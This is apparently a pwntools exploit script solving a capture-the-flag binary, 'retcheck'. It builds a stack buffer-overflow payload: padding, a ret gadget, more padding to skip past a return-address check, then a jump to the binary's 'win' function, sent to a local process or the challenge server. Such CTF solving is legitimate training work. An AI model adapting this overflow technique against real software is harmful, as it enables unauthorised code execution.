#!/usr/bin/env python
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './retcheck'
host = 'challenge.ctf.games'
port = 31463

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

ret = 0x401465
win = 0x4012e9
libc_start_main = 424

buf = b'A' * (51 * 8)
buf += p64(ret)
buf += b'A' * (libc_start_main-len(buf))
buf += p64(win)

io = start()

io.sendlineafter('retcheck enabled !!\n', buf)

io.interactive()

